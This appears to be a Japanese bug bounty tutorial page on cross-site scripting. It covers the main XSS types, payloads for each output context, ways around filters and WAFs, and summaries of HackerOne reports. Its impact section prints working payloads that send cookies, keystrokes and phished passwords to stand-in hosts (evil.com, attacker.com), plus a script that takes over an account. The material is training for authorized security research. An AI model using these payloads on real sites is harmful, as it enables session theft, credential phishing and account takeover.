@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS (Cross-Site Scripting) - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; XSS
+        </div>
+
+        <div class="page-header">
+            <h1>XSS (Cross-Site Scripting)</h1>
+            <p class="subtitle">
+                攻撃者が被害者のブラウザ上で任意の JavaScript を実行する。
+                BB で最も報告数が多い脆弱性クラスの1つ。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+            </div>
+        </div>
+
+        <div class="callout">
+            <div class="callout-title">Prerequisites (前提知識)</div>
+            <p>Module 00 (HTTP) と Module 01 (Browser Security) を先に完了してください。特に SOP, Cookie, CSP の理解が XSS の impact を正しく評価するために必要です。</p>
+        </div>
+
+        <!-- 最初の一歩 -->
+        <div class="section">
+            <h2>まず体感する: 30秒で分かる XSS</h2>
+            <p>ブラウザの DevTools コンソール (F12 → Console) を開いて、以下を入力してみよう:</p>
+<pre><code>document.body.innerHTML = '&lt;h1&gt;ページを書き換えた!&lt;/h1&gt;';</code></pre>
+            <p>
+                ページの内容が書き変わったはず。これが JavaScript でできること。
+                XSS とは、<strong>攻撃者がこのような JavaScript を、他人のブラウザ上で実行させる</strong>攻撃だ。
+            </p>
+            <p>
+                ここで使った <code>innerHTML</code> は DOM (Document Object Model = ブラウザがHTMLをJavaScriptで操作するためのツリー構造) を直接操作するプロパティ。
+                これが攻撃の「出口」(Sink) になる。
+            </p>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>XSS の原理</h2>
+            <p>
+                Webアプリケーションが <strong>ユーザー入力を適切にサニタイズ (=危険な文字を除去/無害化) せずに HTML/JavaScript として出力</strong> すると、
+                攻撃者が注入したスクリプトが被害者のブラウザで実行される。
+            </p>
+            <p>
+                結果として: セッションの窃取、フィッシング、キーロギング、他ユーザーへのアクション実行（アカウント乗っ取り）が可能になる。
+            </p>
+
+            <div class="mermaid">
+sequenceDiagram
+    participant Attacker as 攻撃者
+    participant Victim as 被害者
+    participant Server as 脆弱サーバー
+    participant Evil as 攻撃者サーバー
+
+    Attacker->>Victim: 悪意あるURL/ページを送付
+    Victim->>Server: リクエスト (payload含む)
+    Server->>Victim: レスポンス (スクリプト反射/保存)
+    Note over Victim: ブラウザでJS実行
+    Victim->>Evil: document.cookie送信
+    Evil->>Attacker: Cookie窃取完了
+    Attacker->>Server: 被害者のCookieでアクセス (ATO)
+            </div>
+
+            <div class="callout">
+                <div class="callout-title">XSS の Impact (BB 観点)</div>
+                <p>
+                    単純な <code>alert(1)</code> だけでは Low〜Medium 評価になりがち。
+                    BB で高い severity を得るには <strong>実際の impact を示す</strong> ことが重要:
+                </p>
+                <ul>
+                    <li>Account Takeover (ATO): セッション Cookie 窃取 or パスワード変更実行</li>
+                    <li>Stored XSS + Admin panel: 管理者の権限で任意操作</li>
+                    <li>Self-XSS + CSRF chain: 被害者に self-XSS を踏ませる</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>XSS の種類</h2>
+
+            <h3>1. Reflected XSS</h3>
+            <p>
+                ユーザーの入力がリクエスト内に含まれ、レスポンスにそのまま反射 (reflect) される。
+                攻撃者は悪意あるURLを被害者に踏ませる必要がある。
+            </p>
+<pre><code>// 脆弱なサーバー側コード (Express)
+app.get('/search', (req, res) => {
+    res.send(`&lt;h1&gt;検索結果: ${req.query.q}&lt;/h1&gt;`);
+});
+
+// Attack URL
+https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code></pre>
+
+            <h3>2. Stored XSS (Persistent XSS)</h3>
+            <p>
+                攻撃者の入力がサーバーに保存され、他のユーザーがそのページを表示するたびにスクリプトが実行される。
+                Impact が高い（被害者がリンクを踏む必要がない）。
+            </p>
+<pre><code>// プロフィール表示 (脆弱)
+&lt;div class="bio"&gt;${user.bio}&lt;/div&gt;
+
+// 攻撃者が bio に設定
+&lt;img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"&gt;</code></pre>
+
+            <h3>3. DOM-based XSS</h3>
+            <p>
+                サーバーを経由せず、<strong>クライアントサイドの JavaScript</strong> がユーザー入力を unsafe な方法で DOM に書き込む。
+                レスポンス body には payload が含まれないため、WAF での検知が困難。
+            </p>
+<pre><code>// 脆弱な JS コード
+const hash = location.hash.slice(1);
+document.getElementById('output').innerHTML = hash;
+
+// Attack URL
+https://example.com/page#&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
+
+            <h4>DOM XSS の Source と Sink</h4>
+            <table>
+                <thead><tr><th>Source (入力元)</th><th>Sink (出力先 - 危険)</th></tr></thead>
+                <tbody>
+                    <tr><td><code>location.hash</code></td><td><code>element.innerHTML</code></td></tr>
+                    <tr><td><code>location.search</code></td><td><code>document.write()</code></td></tr>
+                    <tr><td><code>document.referrer</code></td><td><code>eval()</code></td></tr>
+                    <tr><td><code>window.name</code></td><td><code>setTimeout(string)</code></td></tr>
+                    <tr><td><code>postMessage data</code></td><td><code>jQuery.html()</code></td></tr>
+                    <tr><td><code>localStorage/sessionStorage</code></td><td><code>$.globalEval()</code></td></tr>
+                </tbody>
+            </table>
+
+            <h3>4. Mutation XSS (mXSS)</h3>
+            <p>
+                HTMLサニタイザーが安全と判定した HTML が、ブラウザの DOM パーサーによる<strong>正規化 (mutation)</strong> の結果
+                実行可能な形に変化する。DOMPurify の bypass 事例が有名。
+            </p>
+<pre><code>// サニタイザーは安全と判定するが、ブラウザのparser が mutation する例
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src onerror=alert(1)&gt;</code></pre>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>XSS の検出方法</h2>
+
+            <h3>Step 1: Reflection Point の発見</h3>
+            <ol>
+                <li>全ての入力ポイントに一意のプローブ文字列を送る (例: <code>xss123test</code>)</li>
+                <li>レスポンス内でプローブがどこに出力されるか確認</li>
+                <li>出力コンテキストを特定: HTML body? 属性内? JavaScript 内? URL 内?</li>
+            </ol>
+
+            <h3>Step 2: コンテキスト別 Payload</h3>
+            <table>
+                <thead><tr><th>コンテキスト</th><th>例</th><th>Break-out payload</th></tr></thead>
+                <tbody>
+                    <tr>
+                        <td>HTML body</td>
+                        <td><code>&lt;p&gt;USER_INPUT&lt;/p&gt;</code></td>
+                        <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>HTML 属性 (quoted)</td>
+                        <td><code>&lt;input value="USER_INPUT"&gt;</code></td>
+                        <td><code>" onfocus=alert(1) autofocus="</code><br><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>HTML 属性 (unquoted)</td>
+                        <td><code>&lt;input value=USER_INPUT&gt;</code></td>
+                        <td><code> onfocus=alert(1) autofocus </code></td>
+                    </tr>
+                    <tr>
+                        <td>JavaScript 文字列内</td>
+                        <td><code>var x = 'USER_INPUT';</code></td>
+                        <td><code>'; alert(1); //</code><br><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>JavaScript template literal</td>
+                        <td><code>var x = `${USER_INPUT}`;</code></td>
+                        <td><code>${alert(1)}</code></td>
+                    </tr>
+                    <tr>
+                        <td>href/src 属性</td>
+                        <td><code>&lt;a href="USER_INPUT"&gt;</code></td>
+                        <td><code>javascript:alert(1)</code></td>
+                    </tr>
+                    <tr>
+                        <td>CSS</td>
+                        <td><code>background: url(USER_INPUT)</code></td>
+                        <td>(現代ブラウザではほぼ不可能)</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Step 3: Filter / WAF Bypass</h3>
+            <ul>
+                <li><strong>Case variation</strong>: <code>&lt;ScRiPt&gt;</code>, <code>&lt;IMG SRC=x ONERROR=alert(1)&gt;</code></li>
+                <li><strong>Event handler 列挙</strong>: <code>onload, onerror, onfocus, onmouseover, onanimationend...</code></li>
+                <li><strong>Tag 列挙</strong>: <code>&lt;svg&gt;, &lt;math&gt;, &lt;details&gt;, &lt;video&gt;, &lt;body&gt;...</code></li>
+                <li><strong>Encoding</strong>: HTML entity (<code>&amp;#x61;lert(1)</code>), Unicode escapes (JS内)</li>
+                <li><strong>Double encoding</strong>: <code>%253Cscript%253E</code> (サーバーが2回 decode する場合)</li>
+                <li><strong>Null byte</strong>: <code>%00</code> (一部パーサーでの切り捨て)</li>
+                <li><strong>Dangling markup</strong>: 完全なスクリプト注入が無理な場合、属性を壊してデータを外部に送る</li>
+            </ul>
+
+            <div class="callout">
+                <div class="callout-title">自動化ツール</div>
+                <ul>
+                    <li><strong>Burp Intruder</strong>: tag/event handler の全組み合わせを自動テスト</li>
+                    <li><strong>XSStrike</strong>: DOM / Reflected 両方を自動検出</li>
+                    <li><strong>dalfox</strong>: パラメータ単位の XSS スキャナー</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- 防御と bypass -->
+        <div class="section">
+            <h2>防御手法とその Bypass</h2>
+
+            <h3>HTML Encoding</h3>
+            <p>
+                <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>"</code> → <code>&amp;quot;</code> 等。
+                <strong>正しく実装されていれば HTML body context の XSS は防げる。</strong>
+            </p>
+            <p>Bypass: JavaScript context 内では HTML encoding が効かない。<code>var x = '{{input}}'</code> に <code>'; alert(1); //</code> を入れても encoding されない。</p>
+
+            <h3>Blocklist フィルター</h3>
+            <p>
+                <code>&lt;script&gt;</code> や <code>alert</code> をブロック。
+            </p>
+            <p>Bypass: 別のタグ + event handler (<code>&lt;img onerror&gt;</code>)、別の関数 (<code>confirm</code>, <code>prompt</code>, <code>print</code>, <code>window['al'+'ert'](1)</code>)</p>
+
+            <h3>WAF (Web Application Firewall)</h3>
+            <p>ネットワークレベルで payload を検知してブロック。</p>
+            <p>Bypass: chunked encoding, HTTP/2 binary framing, Unicode normalization, parameter pollution</p>
+
+            <h3>CSP (Content Security Policy)</h3>
+            <p>XSS が成功しても、スクリプトの実行を制限する defense-in-depth。</p>
+            <p>Bypass: CSP module (01-browser-security.html) 参照。unsafe-inline, JSONP on whitelisted domain, base-uri 等。</p>
+        </div>
+
+        <!-- Impact demonstration -->
+        <div class="section">
+            <h2>Impact Demonstration (BB report で使う)</h2>
+
+            <h3>Session 窃取 (HttpOnly なし)</h3>
+<pre><code>&lt;script&gt;
+fetch('https://attacker.com/log?c=' + document.cookie);
+&lt;/script&gt;</code></pre>
+
+            <h3>Account Takeover (パスワード変更)</h3>
+<pre><code>&lt;script&gt;
+// CSRF token を取得してパスワードを変更
+fetch('/settings')
+  .then(r => r.text())
+  .then(html => {
+    const token = html.match(/csrf_token.*?value="(.*?)"/)[1];
+    fetch('/settings/password', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: `csrf=${token}&new_password=hacked123&confirm=hacked123`
+    });
+  });
+&lt;/script&gt;</code></pre>
+
+            <h3>Keylogger</h3>
+<pre><code>&lt;script&gt;
+document.onkeypress = e => {
+  fetch('https://attacker.com/keys?k=' + e.key);
+};
+&lt;/script&gt;</code></pre>
+
+            <h3>Phishing (偽ログインフォーム)</h3>
+<pre><code>&lt;script&gt;
+document.body.innerHTML = `
+  &lt;h2&gt;Session expired. Please login again.&lt;/h2&gt;
+  &lt;form action="https://attacker.com/phish" method="POST"&gt;
+    &lt;input name="email" placeholder="Email"&gt;
+    &lt;input name="password" type="password" placeholder="Password"&gt;
+    &lt;button&gt;Login&lt;/button&gt;
+  &lt;/form&gt;`;
+&lt;/script&gt;</code></pre>
+
+            <div class="callout danger">
+                <div class="callout-title">注意: BB report での PoC</div>
+                <p>
+                    実際のBBレポートでは <code>alert(document.domain)</code> または <code>alert(document.cookie)</code> で十分。
+                    実際に Cookie を外部に送信する PoC は <strong>自分の管理下のサーバーに限定</strong> し、
+                    他のユーザーに影響を与えないこと。
+                </p>
+            </div>
+        </div>
+
+        <!-- Real-world examples -->
+        <div class="section">
+            <h2>Real-World Reports (HackerOne 実例解析)</h2>
+            <p>
+                実際に報奨金が支払われた XSS レポートから、<strong>どこで見つけたか・どう chain したか・なぜ高額になったか</strong>を分析する。
+                出典: <a href="https://github.com/reddelexc/hackerone-reports" target="_blank">hackerone-reports (Top by bug type)</a>
+            </p>
+
+            <h3>Case 1: PayPal Stored XSS via Cache Poisoning ($18,900 + $20,000)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/488147" target="_blank">#488147</a> + <a href="https://hackerone.com/reports/510152" target="_blank">#510152</a> (bypass)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>PayPal のログインページ (<code>paypal.com/signin</code>) が CDN 経由で配信されている</li>
+                    <li>攻撃者が Cache Poisoning でログインページの HTML に悪意ある script を注入</li>
+                    <li>キャッシュされた汚染ページが <strong>全ユーザーに配信</strong> される (Stored XSS 相当)</li>
+                    <li>ログインフォームのクレデンシャルを窃取 → Account Takeover</li>
+                </ol>
+                <p><strong>なぜ高額:</strong></p>
+                <ul>
+                    <li>ログインページ = 全ユーザーが通るクリティカルパス</li>
+                    <li>Cache Poisoning で「攻撃者のアクション1回」で全ユーザーに影響</li>
+                    <li>最初の修正をbypassした #510152 がさらに $20,000</li>
+                </ul>
+                <p><strong>学び:</strong> XSS 単体では Medium だが、Cache Poisoning と組み合わせると
+                Stored 相当 + mass impact になり Critical に昇格する。Phase 4 の <a href="45-cache-poisoning.html">Web Cache Poisoning</a> で詳細。</p>
+            </div>
+
+            <h3>Case 2: Reddit 1-Click ATO via Apple Sign-In + XSS (500 upvotes)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1567186" target="_blank">#1567186</a> (500 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>Apple Sign-In の OAuth flow で <code>response_type</code> を <code>code</code> から <code>code id_token</code> に変更</li>
+                    <li>Apple が id_token を <strong>fragment (#)</strong> に付けて redirect する</li>
+                    <li>Redirect 先が <code>www.redditmedia.com</code> (XSS あり) を経由</li>
+                    <li>XSS で fragment の id_token を窃取 → 被害者のアカウントに Apple Sign-In でログイン</li>
+                </ol>
+                <p><strong>学び:</strong> OAuth の response_type 変更 + open redirect + XSS の 3-step chain。
+                単体では Low の XSS が <strong>OAuth token theft</strong> の踏み台になると Critical。
+                Phase 4 の <a href="42-oauth-attacks.html">OAuth Attacks</a> で詳細。</p>
+            </div>
+
+            <h3>Case 3: GitLab Stored XSS via Kroki Diagram ($13,950)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1731349" target="_blank">#1731349</a> (292 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>GitLab の Markdown 内で Kroki ダイアグラムを埋め込める機能</li>
+                    <li>Kroki のレンダリング結果 (SVG) が <strong>サニタイズ不足</strong>で返される</li>
+                    <li>SVG 内に <code>&lt;script&gt;</code> や event handler を含めると実行される</li>
+                    <li>Issue / MR の description に書くだけで、閲覧者全員に XSS が発火 (Stored)</li>
+                </ol>
+                <p><strong>学び:</strong> Markdown レンダラーの外部サービス連携 (Kroki, Mermaid 等) は XSS の温床。
+                SVG は「画像」だが script を含められる。<code>Content-Type: image/svg+xml</code> で inline 表示されると危険。</p>
+            </div>
+
+            <h3>Case 4: Shopify DOM XSS via postMessage ($9,400)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1444682" target="_blank">#1444682</a> (234 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>Shopify の管理画面が <code>window.addEventListener('message', ...)</code> でクロスオリジンメッセージを受信</li>
+                    <li>Origin の検証が不十分 (正規表現のミス or 未検証)</li>
+                    <li>攻撃者の iframe から <code>postMessage</code> で DOM に HTML を注入</li>
+                    <li>Admin セッションで任意操作が可能に</li>
+                </ol>
+                <p><strong>学び:</strong> <code>postMessage</code> は DOM XSS の主要 source。
+                検出方法: JS ファイル内で <code>addEventListener('message'</code> を grep → handler 内で origin チェックの有無を確認 → innerHTML / eval 等の sink に到達するか追跡。</p>
+            </div>
+
+            <h3>Case 5: Valve (Steam) XSS → RCE via Electron ($7,500)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/409850" target="_blank">#409850</a> (485 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>Steam のチャットクライアントが React ベースで、一部の入力がサニタイズされていない</li>
+                    <li>チャットメッセージ内の特定のフォーマットで XSS が発火</li>
+                    <li>Steam クライアント = <strong>Electron ベース</strong> → XSS が Node.js コンテキストで動く</li>
+                    <li>Node.js API 経由でローカルファイルの読み書き、コマンド実行が可能 (RCE)</li>
+                </ol>
+                <p><strong>学び:</strong> Electron アプリの XSS は Web アプリの XSS と比べて <strong>impact が桁違い</strong>。
+                <code>nodeIntegration: true</code> / <code>contextIsolation: false</code> の設定だと XSS = RCE。
+                Desktop アプリの BB プログラムは特に狙い目。</p>
+            </div>
+
+            <h3>高額 XSS のパターン分析</h3>
+            <table>
+                <thead><tr><th>パターン</th><th>Impact 上昇理由</th><th>報奨金レンジ</th></tr></thead>
+                <tbody>
+                    <tr><td>Stored XSS + Admin panel</td><td>管理者の全権限を奪取</td><td>$5,000 ~ $16,000</td></tr>
+                    <tr><td>XSS + OAuth token theft</td><td>1-click ATO (全ユーザー)</td><td>$5,000 ~ $20,000</td></tr>
+                    <tr><td>XSS + Cache Poisoning</td><td>Mass impact (全閲覧者)</td><td>$10,000 ~ $20,000</td></tr>
+                    <tr><td>XSS in Electron/Desktop</td><td>XSS = RCE</td><td>$7,500 ~ $20,000</td></tr>
+                    <tr><td>Blind XSS (admin panel hit)</td><td>Internal system への影響</td><td>$1,000 ~ $5,000</td></tr>
+                    <tr><td>認証ドメインの XSS</td><td>Credential 窃取が直接可能</td><td>$5,000 ~ $15,000</td></tr>
+                    <tr><td>CSP bypass 付き Stored XSS</td><td>防御を突破した証明</td><td>$5,000 ~ $14,000</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout success">
+                <div class="callout-title">低額 XSS を避けるには</div>
+                <p>
+                    <strong>Self-XSS</strong> (自分にしか影響しない) や <strong>CSP で完全にブロックされる XSS</strong> は
+                    Informative / Low 扱いになりがち。report 前に以下を確認:
+                </p>
+                <ul>
+                    <li>被害者が攻撃者の link をクリック or ページを閲覧するだけで発火するか？</li>
+                    <li>CSP が <code>script-src 'self'</code> のみで bypass 不可能ではないか？</li>
+                    <li>Impact を ATO / data theft / privilege escalation まで chain できるか？</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice</h2>
+
+            <h4>Web Security Academy Labs (推奨順)</h4>
+            <ol>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" target="_blank">Reflected XSS into HTML context with nothing encoded</a> (Apprentice)</li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" target="_blank">Stored XSS into HTML context with nothing encoded</a> (Apprentice)</li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" target="_blank">DOM XSS in document.write sink</a> (Apprentice)</li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked" target="_blank">Reflected XSS with most tags and attributes blocked</a> (Practitioner)</li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded" target="_blank">Reflected XSS in JS string with angle brackets HTML encoded</a> (Practitioner)</li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored" target="_blank">Stored DOM XSS</a> (Practitioner)</li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies" target="_blank">Exploiting XSS to steal cookies</a> (Practitioner)</li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy" target="_blank">XSS with CSP bypass</a> (Expert)</li>
+            </ol>
+
+            <h4>ローカル演習</h4>
+            <ul>
+                <li><code>practice/bb-whitebox-01</code> の route ファイルで XSS sink を探す (Phase 2 で詳細)</li>
+                <li><a href="https://xss-game.appspot.com/" target="_blank">XSS Game (Google)</a></li>
+                <li><a href="https://prompt.ml/" target="_blank">prompt.ml</a> — XSS filter bypass チャレンジ</li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>出力コンテキスト</strong>を必ず特定する — HTML body, 属性, JS 内, URL で payload が全く違う</li>
+                    <li><strong>DOM XSS は server response に痕跡が残らない</strong> — JS ファイルの source→sink 分析が必要</li>
+                    <li><strong>Impact を示す</strong> — alert() だけでなく ATO/data theft の PoC を付ける</li>
+                    <li><strong>Stored > Reflected</strong> — 保存型は被害者がリンクを踏む必要がない分、severity が高い</li>
+                    <li><strong>CSP は defence-in-depth</strong> — XSS が見つかっても CSP が堅ければ severity は下がる</li>
+                    <li><strong>mXSS</strong> — HTML サニタイザーを使っていても安心できない（ブラウザの DOM 正規化で突破される）</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger: XSS</a></li>
+                <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">PortSwigger XSS Cheat Sheet</a> — 全 tag/event/browser matrix</li>
+                <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP: XSS</a></li>
+                <li><a href="https://cure53.de/fp170.pdf" target="_blank">Cure53: mXSS Research</a></li>
+            </ul>
+        </div>
+
+        <div style="text-align:center; margin: 2rem 0;">
+            <button class="complete-btn" data-module-id="10-xss" onclick="toggleComplete('10-xss')">Mark Complete</button>
+        </div>
+
+        <div class="page-nav">
+            <a href="06-linux-networking.html">&larr; 前: Linux & Networking</a>
+            <a href="11-sqli.html">次: SQL Injection &rarr;</a>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({startOnLoad:true,theme:'dark',themeVariables:{primaryColor:'#1f2a3f',primaryTextColor:'#e6edf3',primaryBorderColor:'#30363d',lineColor:'#58a6ff',secondaryColor:'#161b22',tertiaryColor:'#161b22'}});</script>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
